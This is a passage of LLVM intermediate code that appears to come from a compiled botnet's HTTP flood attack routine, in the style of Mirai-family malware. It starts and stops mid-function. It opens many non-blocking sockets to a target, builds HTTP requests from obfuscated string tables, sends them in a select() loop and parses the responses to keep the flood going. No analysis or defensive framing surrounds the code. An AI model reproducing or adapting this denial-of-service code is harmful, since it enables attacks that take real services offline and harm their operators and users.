  %84 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv678, i32 7, i64 0
  %85 = tail call i32 @util_strcpy(i8* %84, i8* %16)
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %67, i32 2
  %87 = load i8, i8* %86, align 4
  %88 = icmp ult i8 %87, 32
  br i1 %88, label %89, label %93

; <label>:89:                                     ; preds = %79
  %90 = load i32, i32* %68, align 4
  %91 = tail call i32 @ntohl(i32 %90) #11
  %92 = tail call i32 @htonl(i32 %91) #11
  store i32 %92, i32* %70, align 4
  br label %93

; <label>:93:                                     ; preds = %89, %79
  tail call void @table_unlock_val(i8 zeroext 54)
  %94 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv678, i32 5, i64 0
  %95 = tail call i8* @table_retrieve_val(i32 54, i32* null)
  %96 = tail call i32 @util_strcpy(i8* %94, i8* %95)
  tail call void @table_lock_val(i8 zeroext 54)
  %97 = tail call i32 @util_strcpy(i8* %71, i8* %17)
  %indvars.iv.next679 = add nuw nsw i64 %indvars.iv678, 1
  %98 = icmp slt i64 %indvars.iv.next679, %46
  br i1 %98, label %62, label %.preheader601.loopexit

.backedge602.loopexit:                            ; preds = %.loopexit597
  br label %.backedge602.backedge

.backedge602:                                     ; preds = %.backedge602.backedge, %.preheader601
  %99 = call i64 @time(i64* null) #10
  %100 = trunc i64 %99 to i32
  %101 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %51) #10, !srcloc !1
  %102 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %52) #10, !srcloc !2
  br i1 %49, label %.lr.ph624.preheader, label %.backedge602.backedge

.lr.ph624.preheader:                              ; preds = %.backedge602
  br label %.lr.ph624

.lr.ph624:                                        ; preds = %.lr.ph624.preheader, %370
  %indvars.iv = phi i64 [ %indvars.iv.next, %370 ], [ 0, %.lr.ph624.preheader ]
  %.0530621 = phi i32 [ %.1531, %370 ], [ 0, %.lr.ph624.preheader ]
  %103 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv
  %104 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 1
  %105 = load i8, i8* %104, align 4
  %106 = icmp eq i8 %105, 1
  br i1 %106, label %107, label %111

; <label>:107:                                    ; preds = %.lr.ph624
  %108 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 12
  %109 = load i32, i32* %108, align 4
  %110 = icmp ne i32 %109, 0
  %.sink = select i1 %110, i8 4, i8 0
  store i8 %.sink, i8* %104, align 4
  br label %111

; <label>:111:                                    ; preds = %107, %.lr.ph624
  %112 = phi i8 [ %.sink, %107 ], [ %105, %.lr.ph624 ]
  switch i8 %112, label %366 [
    i8 0, label %113
    i8 2, label %145
    i8 4, label %167
    i8 6, label %327
    i8 7, label %340
    i8 10, label %353
  ]

; <label>:113:                                    ; preds = %111
  call void @llvm.memset.p0i8.i64(i8* nonnull %53, i8 0, i64 16, i32 4, i1 false)
  %114 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %103, i64 0, i32 0
  %115 = load i32, i32* %114, align 4
  %116 = icmp eq i32 %115, -1
  br i1 %116, label %119, label %117

; <label>:117:                                    ; preds = %113
  %118 = call i32 @close(i32 %115) #10
  br label %119

; <label>:119:                                    ; preds = %113, %117
  %120 = call i32 @socket(i32 2, i32 1, i32 0) #10
  store i32 %120, i32* %114, align 4
  %121 = icmp eq i32 %120, -1
  br i1 %121, label %370, label %122

; <label>:122:                                    ; preds = %119
  %123 = call i32 (i32, i32, ...) @fcntl(i32 %120, i32 3, i32 0) #10
  %124 = or i32 %123, 2048
  %125 = call i32 (i32, i32, ...) @fcntl(i32 %120, i32 4, i32 %124) #10
  store i32 65535, i32* %5, align 4
  %126 = load i32, i32* %114, align 4
  %127 = call i32 @setsockopt(i32 %126, i32 0, i32 8, i8* nonnull %54, i32 4) #10
  store i16 2, i16* %55, align 4
  %128 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 4
  %129 = load i32, i32* %128, align 4
  store i32 %129, i32* %56, align 4
  %130 = call zeroext i16 @htons(i16 zeroext %20) #11
  store i16 %130, i16* %57, align 2
  %131 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 2
  store i32 %100, i32* %131, align 4
  store i8 2, i8* %104, align 4
  %132 = load i32, i32* %114, align 4
  %133 = call i32 @connect(i32 %132, %struct.sockaddr* nonnull %58, i32 16) #10
  %134 = load i32, i32* %114, align 4
  %135 = srem i32 %134, 64
  %136 = zext i32 %135 to i64
  %137 = shl i64 1, %136
  %138 = sdiv i32 %134, 64
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %139
  %141 = load i64, i64* %140, align 8
  %142 = or i64 %137, %141
  store i64 %142, i64* %140, align 8
  %143 = icmp sgt i32 %134, %.0530621
  %144 = add nsw i32 %134, 1
  %..0530 = select i1 %143, i32 %144, i32 %.0530621
  br label %370

; <label>:145:                                    ; preds = %111
  %146 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 2
  %147 = load i32, i32* %146, align 4
  %148 = sub i32 %100, %147
  %149 = icmp ugt i32 %148, 30
  br i1 %149, label %150, label %154

; <label>:150:                                    ; preds = %145
  store i8 0, i8* %104, align 4
  %151 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %103, i64 0, i32 0
  %152 = load i32, i32* %151, align 4
  %153 = call i32 @close(i32 %152) #10
  store i32 -1, i32* %151, align 4
  br label %370

; <label>:154:                                    ; preds = %145
  %155 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %103, i64 0, i32 0
  %156 = load i32, i32* %155, align 4
  %157 = srem i32 %156, 64
  %158 = zext i32 %157 to i64
  %159 = shl i64 1, %158
  %160 = sdiv i32 %156, 64
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %161
  %163 = load i64, i64* %162, align 8
  %164 = or i64 %159, %163
  store i64 %164, i64* %162, align 8
  %165 = icmp sgt i32 %156, %.0530621
  %166 = add nsw i32 %156, 1
  %..0530550 = select i1 %165, i32 %166, i32 %.0530621
  br label %370

; <label>:167:                                    ; preds = %111
  %168 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 14
  store i32 -1, i32* %168, align 4
  %169 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 11
  store i32 0, i32* %169, align 4
  %170 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 18, i64 0
  call void @util_zero(i8* %170, i32 1024)
  %171 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 17
  store i32 0, i32* %171, align 4
  call void @util_zero(i8* nonnull %59, i32 10240)
  %172 = call i32 @util_strlen(i8* nonnull %59)
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %173
  %175 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 9, i64 0
  %176 = call i32 @util_strcpy(i8* %174, i8* %175)
  %177 = call i32 @util_strlen(i8* nonnull %59)
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %178
  %180 = call i32 @util_strcpy(i8* %179, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %181 = call i32 @util_strlen(i8* nonnull %59)
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %182
  %184 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 6, i64 0
  %185 = call i32 @util_strcpy(i8* %183, i8* %184)
  %186 = call i32 @util_strlen(i8* nonnull %59)
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %187
  %189 = call i32 @util_strcpy(i8* %188, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0))
  %190 = call i32 @util_strlen(i8* nonnull %59)
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %191
  %193 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 5, i64 0
  %194 = call i32 @util_strcpy(i8* %192, i8* %193)
  %195 = call i32 @util_strlen(i8* nonnull %59)
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %196
  %198 = call i32 @util_strcpy(i8* %197, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0))
  %199 = call i32 @util_strlen(i8* nonnull %59)
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %200
  %202 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 7, i64 0
  %203 = call i32 @util_strcpy(i8* %201, i8* %202)
  %204 = call i32 @util_strlen(i8* nonnull %59)
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %205
  %207 = call i32 @util_strcpy(i8* %206, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 zeroext 39)
  %208 = call i32 @util_strlen(i8* nonnull %59)
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %209
  %211 = call i8* @table_retrieve_val(i32 39, i32* null)
  %212 = call i32 @util_strcpy(i8* %210, i8* %211)
  call void @table_lock_val(i8 zeroext 39)
  %213 = call i32 @util_strlen(i8* nonnull %59)
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %214
  %216 = call i32 @util_strcpy(i8* %215, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 zeroext 40)
  %217 = call i32 @util_strlen(i8* nonnull %59)
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %218
  %220 = call i8* @table_retrieve_val(i32 40, i32* null)
  %221 = call i32 @util_strcpy(i8* %219, i8* %220)
  call void @table_lock_val(i8 zeroext 40)
  %222 = call i32 @util_strlen(i8* nonnull %59)
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %223
  %225 = call i32 @util_strcpy(i8* %224, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 zeroext 41)
  %226 = call i32 @util_strlen(i8* nonnull %59)
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %227
  %229 = call i8* @table_retrieve_val(i32 41, i32* null)
  %230 = call i32 @util_strcpy(i8* %228, i8* %229)
  call void @table_lock_val(i8 zeroext 41)
  %231 = call i32 @util_strlen(i8* nonnull %59)
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %232
  %234 = call i32 @util_strcpy(i8* %233, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  br i1 %60, label %235, label %263

; <label>:235:                                    ; preds = %167
  call void @table_unlock_val(i8 zeroext 42)
  %236 = call i32 @util_strlen(i8* nonnull %59)
  %237 = sext i32 %236 to i64
  %238 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %237
  %239 = call i8* @table_retrieve_val(i32 42, i32* null)
  %240 = call i32 @util_strcpy(i8* %238, i8* %239)
  call void @table_lock_val(i8 zeroext 42)
  %241 = call i32 @util_strlen(i8* nonnull %59)
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %242
  %244 = call i32 @util_strcpy(i8* %243, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  %245 = call i32 @util_strlen(i8* nonnull %59)
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %246
  %248 = call i8* @table_retrieve_val(i32 47, i32* null)
  %249 = call i32 @util_strcpy(i8* %247, i8* %248)
  %250 = call i32 @util_strlen(i8* nonnull %59)
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %251
  %253 = call i32 @util_strcpy(i8* %252, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %254 = call i32 @util_strlen(i8* nonnull %14)
  %255 = call i32 @util_strlen(i8* nonnull %59)
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %256
  %258 = call i8* @util_itoa(i32 %254, i32 10, i8* %257)
  %259 = call i32 @util_strlen(i8* nonnull %59)
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %260
  %262 = call i32 @util_strcpy(i8* %261, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  br label %263

; <label>:263:                                    ; preds = %235, %167
  %264 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 15
  %265 = load i32, i32* %264, align 4
  %266 = icmp sgt i32 %265, 0
  br i1 %266, label %267, label %293

; <label>:267:                                    ; preds = %263
  %268 = call i32 @util_strlen(i8* nonnull %59)
  %269 = sext i32 %268 to i64
  %270 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %269
  %271 = call i32 @util_strcpy(i8* %270, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %5, align 4
  %272 = load i32, i32* %264, align 4
  %273 = icmp sgt i32 %272, 0
  %274 = call i32 @util_strlen(i8* nonnull %59)
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %275
  br i1 %273, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %267
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %277 = phi i8* [ %291, %.lr.ph ], [ %276, %.lr.ph.preheader ]
  %storemerge548620 = phi i32 [ %286, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %278 = sext i32 %storemerge548620 to i64
  %279 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 16, i64 %278, i64 0
  %280 = call i32 @util_strcpy(i8* %277, i8* %279)
  %281 = call i32 @util_strlen(i8* nonnull %59)
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %282
  %284 = call i32 @util_strcpy(i8* %283, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0))
  %285 = load i32, i32* %5, align 4
  %286 = add nsw i32 %285, 1
  store i32 %286, i32* %5, align 4
  %287 = load i32, i32* %264, align 4
  %288 = icmp slt i32 %286, %287
  %289 = call i32 @util_strlen(i8* nonnull %59)
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %290
  br i1 %288, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %267
  %.lcssa = phi i8* [ %276, %267 ], [ %291, %._crit_edge.loopexit ]
  %292 = call i32 @util_strcpy(i8* %.lcssa, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  br label %293

; <label>:293:                                    ; preds = %._crit_edge, %263
  %294 = call i32 @util_strlen(i8* nonnull %59)
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %295
  %297 = call i32 @util_strcpy(i8* %296, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  br i1 %60, label %298, label %303

; <label>:298:                                    ; preds = %293
  %299 = call i32 @util_strlen(i8* nonnull %59)
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %300
  %302 = call i32 @util_strcpy(i8* %301, i8* nonnull %14)
  br label %303

; <label>:303:                                    ; preds = %298, %293
  %304 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 10, i64 0
  %305 = call signext i8 @util_strcmp(i8* nonnull %175, i8* %304)
  %306 = icmp eq i8 %305, 0
  br i1 %306, label %307, label %309

; <label>:307:                                    ; preds = %303
  %308 = call i32 @util_strcpy(i8* nonnull %175, i8* %304)
  br label %309

; <label>:309:                                    ; preds = %303, %307
  %310 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %103, i64 0, i32 0
  %311 = load i32, i32* %310, align 4
  %312 = call i32 @util_strlen(i8* nonnull %59)
  %313 = sext i32 %312 to i64
  %314 = call i64 @send(i32 %311, i8* nonnull %59, i64 %313, i32 16384) #10
  %315 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv, i32 3
  store i32 %100, i32* %315, align 4
  store i8 6, i8* %104, align 4
  %316 = load i32, i32* %310, align 4
  %317 = srem i32 %316, 64
  %318 = zext i32 %317 to i64
  %319 = shl i64 1, %318
  %320 = sdiv i32 %316, 64
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %321
  %323 = load i64, i64* %322, align 8
  %324 = or i64 %319, %323
  store i64 %324, i64* %322, align 8
  %325 = icmp sgt i32 %316, %.0530621
  %326 = add nsw i32 %316, 1
  %..0530551 = select i1 %325, i32 %326, i32 %.0530621
  br label %370

; <label>:327:                                    ; preds = %111
  %328 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %103, i64 0, i32 0
  %329 = load i32, i32* %328, align 4
  %330 = srem i32 %329, 64
  %331 = zext i32 %330 to i64
  %332 = shl i64 1, %331
  %333 = sdiv i32 %329, 64
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %334
  %336 = load i64, i64* %335, align 8
  %337 = or i64 %332, %336
  store i64 %337, i64* %335, align 8
  %338 = icmp sgt i32 %329, %.0530621
  %339 = add nsw i32 %329, 1
  %..0530552 = select i1 %338, i32 %339, i32 %.0530621
  br label %370

; <label>:340:                                    ; preds = %111
  %341 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %103, i64 0, i32 0
  %342 = load i32, i32* %341, align 4
  %343 = srem i32 %342, 64
  %344 = zext i32 %343 to i64
  %345 = shl i64 1, %344
  %346 = sdiv i32 %342, 64
  %347 = sext i32 %346 to i64
  %348 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %347
  %349 = load i64, i64* %348, align 8
  %350 = or i64 %345, %349
  store i64 %350, i64* %348, align 8
  %351 = icmp sgt i32 %342, %.0530621
  %352 = add nsw i32 %342, 1
  %..0530553 = select i1 %351, i32 %352, i32 %.0530621
  br label %370

; <label>:353:                                    ; preds = %111
  %354 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %103, i64 0, i32 0
  %355 = load i32, i32* %354, align 4
  %356 = srem i32 %355, 64
  %357 = zext i32 %356 to i64
  %358 = shl i64 1, %357
  %359 = sdiv i32 %355, 64
  %360 = sext i32 %359 to i64
  %361 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %360
  %362 = load i64, i64* %361, align 8
  %363 = or i64 %358, %362
  store i64 %363, i64* %361, align 8
  %364 = icmp sgt i32 %355, %.0530621
  %365 = add nsw i32 %355, 1
  %..0530554 = select i1 %364, i32 %365, i32 %.0530621
  br label %370

; <label>:366:                                    ; preds = %111
  store i8 0, i8* %104, align 4
  %367 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %103, i64 0, i32 0
  %368 = load i32, i32* %367, align 4
  %369 = call i32 @close(i32 %368) #10
  store i32 -1, i32* %367, align 4
  br label %370

; <label>:370:                                    ; preds = %353, %340, %327, %309, %154, %122, %366, %119, %150
  %.1531 = phi i32 [ %.0530621, %119 ], [ %.0530621, %150 ], [ %.0530621, %366 ], [ %..0530, %122 ], [ %..0530550, %154 ], [ %..0530551, %309 ], [ %..0530552, %327 ], [ %..0530553, %340 ], [ %..0530554, %353 ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %371 = icmp slt i64 %indvars.iv.next, %46
  br i1 %371, label %.lr.ph624, label %._crit_edge625

._crit_edge625:                                   ; preds = %370
  %372 = icmp eq i32 %.1531, 0
  br i1 %372, label %.backedge602.backedge, label %373

.backedge602.backedge:                            ; preds = %._crit_edge625, %373, %.backedge602, %.backedge602.loopexit
  br label %.backedge602

; <label>:373:                                    ; preds = %._crit_edge625
  store <2 x i64> <i64 1, i64 0>, <2 x i64>* %9, align 16
  %374 = call i32 @select(i32 %.1531, %struct.fd_set* nonnull %7, %struct.fd_set* nonnull %8, %struct.fd_set* null, %struct.timeval* nonnull %tmpcast) #10
  %375 = call i64 @time(i64* null) #10
  %376 = trunc i64 %375 to i32
  %377 = icmp slt i32 %374, 1
  %brmerge = or i1 %377, %.not
  br i1 %brmerge, label %.backedge602.backedge, label %.lr.ph644.preheader

.lr.ph644.preheader:                              ; preds = %373
  br label %.lr.ph644

.lr.ph644:                                        ; preds = %.lr.ph644.preheader, %.loopexit597
  %indvars.iv676 = phi i64 [ %indvars.iv.next677, %.loopexit597 ], [ 0, %.lr.ph644.preheader ]
  %378 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 0
  %379 = load i32, i32* %378, align 4
  %380 = icmp eq i32 %379, -1
  br i1 %380, label %.loopexit597, label %381

; <label>:381:                                    ; preds = %.lr.ph644
  %382 = sdiv i32 %379, 64
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %383
  %385 = load i64, i64* %384, align 8
  %386 = srem i32 %379, 64
  %387 = zext i32 %386 to i64
  %388 = shl i64 1, %387
  %389 = and i64 %385, %388
  %390 = icmp eq i64 %389, 0
  br i1 %390, label %402, label %391

; <label>:391:                                    ; preds = %381
  store i32 0, i32* %12, align 4
  store i32 4, i32* %13, align 4
  %392 = call i32 @getsockopt(i32 %379, i32 1, i32 4, i8* nonnull %61, i32* nonnull %13) #10
  %393 = load i32, i32* %12, align 4
  %394 = or i32 %393, %392
  %395 = icmp eq i32 %394, 0
  br i1 %395, label %396, label %398

; <label>:396:                                    ; preds = %391
  %397 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 1
  store i8 4, i8* %397, align 4
  %.pre680 = load i32, i32* %378, align 4
  br label %402

; <label>:398:                                    ; preds = %391
  %399 = load i32, i32* %378, align 4
  %400 = call i32 @close(i32 %399) #10
  store i32 -1, i32* %378, align 4
  %401 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 1
  store i8 0, i8* %401, align 4
  br label %.loopexit597

; <label>:402:                                    ; preds = %381, %396
  %403 = phi i32 [ %379, %381 ], [ %.pre680, %396 ]
  %404 = sdiv i32 %403, 64
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %405
  %407 = load i64, i64* %406, align 8
  %408 = srem i32 %403, 64
  %409 = zext i32 %408 to i64
  %410 = shl i64 1, %409
  %411 = and i64 %410, %407
  %412 = icmp eq i64 %411, 0
  br i1 %412, label %.loopexit597, label %413

; <label>:413:                                    ; preds = %402
  %414 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 1
  %415 = load i8, i8* %414, align 4
  switch i8 %415, label %.loopexit597 [
    i8 6, label %424
    i8 7, label %.preheader596
    i8 10, label %.preheader598.preheader
  ]

.preheader598.preheader:                          ; preds = %413
  br label %.preheader598

.preheader596:                                    ; preds = %413
  %416 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 17
  %417 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 18, i64 0
  %418 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 18, i64 64
  %419 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 2
  %420 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 14
  %421 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 11
  %422 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 13
  %423 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 15
  br label %834

; <label>:424:                                    ; preds = %413
  call void @util_zero(i8* nonnull %21, i32 10240)
  %425 = load i32, i32* %378, align 4
  %426 = call i64 @recv(i32 %425, i8* nonnull %21, i64 10240, i32 16386) #10
  %427 = trunc i64 %426 to i32
  %428 = icmp slt i32 %427, 1
  br i1 %428, label %429, label %432

; <label>:429:                                    ; preds = %424
  %430 = load i32, i32* %378, align 4
  %431 = call i32 @close(i32 %430) #10
  store i32 -1, i32* %378, align 4
  store i8 0, i8* %414, align 4
  br label %.loopexit597

; <label>:432:                                    ; preds = %424
  %433 = call i32 @util_memsearch(i8* nonnull %21, i32 %427, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 4)
  %434 = icmp eq i32 %433, -1
  %435 = icmp slt i32 %427, 10240
  %or.cond5 = and i1 %435, %434
  br i1 %or.cond5, label %.loopexit597, label %436

; <label>:436:                                    ; preds = %432
  %437 = sext i32 %433 to i64
  %438 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %437
  store i8 0, i8* %438, align 1
  %439 = call i8* @table_retrieve_val(i32 53, i32* null)
  %440 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %439)
  %441 = icmp eq i32 %440, -1
  br i1 %441, label %444, label %442

; <label>:442:                                    ; preds = %436
  %443 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 11
  store i32 2, i32* %443, align 4
  br label %444

; <label>:444:                                    ; preds = %436, %442
  %445 = call i8* @table_retrieve_val(i32 52, i32* null)
  %446 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %445)
  %447 = icmp eq i32 %446, -1
  br i1 %447, label %450, label %448

; <label>:448:                                    ; preds = %444
  %449 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 11
  store i32 1, i32* %449, align 4
  br label %450

; <label>:450:                                    ; preds = %444, %448
  %451 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 12
  store i32 0, i32* %451, align 4
  %452 = call i8* @table_retrieve_val(i32 51, i32* null)
  %453 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %452)
  %454 = icmp eq i32 %453, -1
  br i1 %454, label %479, label %455

; <label>:455:                                    ; preds = %450
  %456 = call i8* @table_retrieve_val(i32 51, i32* null)
  %457 = call i32 @util_stristr(i8* nonnull %21, i32 %427, i8* %456)
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %458
  %460 = load i8, i8* %459, align 1
  %461 = icmp eq i8 %460, 32
  %462 = zext i1 %461 to i32
  %.555 = add nsw i32 %462, %457
  %463 = sext i32 %.555 to i64
  %464 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %463
  %465 = sub nsw i32 %427, %.555
  %466 = call i32 @util_memsearch(i8* %464, i32 %465, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %467 = icmp eq i32 %466, -1
  br i1 %467, label %479, label %468

; <label>:468:                                    ; preds = %455
  %469 = icmp sgt i32 %466, 1
  %470 = add nsw i32 %466, -2
  %.556 = select i1 %469, i32 %470, i32 %466
  %471 = add nsw i32 %.555, %.556
  %472 = sext i32 %471 to i64
  %473 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %472
  store i8 0, i8* %473, align 1
